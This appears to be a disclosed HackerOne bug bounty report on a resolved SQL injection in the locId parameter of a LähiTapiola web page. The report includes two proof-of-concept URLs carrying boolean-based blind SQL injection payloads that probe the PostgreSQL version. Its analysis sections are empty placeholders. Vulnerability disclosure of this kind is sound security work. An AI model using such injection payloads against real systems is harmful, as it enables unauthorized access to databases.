---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '181826'
original_report_id: '181826'
title: SQL Injection /webApp/sijoitustalous_peruutus locId parameter (viestinta.lahitapiola.fi)
weakness: SQL Injection
team_handle: localtapiola
created_at: '2016-11-12T20:18:41.260Z'
disclosed_at: '2016-12-08T13:19:39.891Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- sql-injection
---

# SQL Injection /webApp/sijoitustalous_peruutus locId parameter (viestinta.lahitapiola.fi)

## Metadata

- HackerOne Report ID: 181826
- Weakness: SQL Injection
- Program: localtapiola
- Disclosed At: 2016-12-08T13:19:39.891Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Vulnerable script**: /webApp/sijoitustalous_peruutus
**Vulnerable parameter**: locId
**Database**: PostgreSQL

**PoC**
1. TRUE, substr(version(),1,10)='PostgreSQL', Result: Ilmoittaumisesi on peruttu

```
http://viestinta.lahitapiola.fi/webApp/sijoitustalous_peruutus?regId=253685182&locId=78976538+and+case+when+substr(version(),1,10)=%27PostgreSQL%27+then+true+else+cast(version()%20as%20numeric)=1+end
```

2. FALSE, substr(version(),1,10)='PostgreXXX', Result: An error occurred

```
http://viestinta.lahitapiola.fi/webApp/sijoitustalous_peruutus?regId=253685182&locId=78976538+and+case+when+substr(version(),1,10)=%27PostgreXXX%27+then+true+else+cast(version()%20as%20numeric)=1+end
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
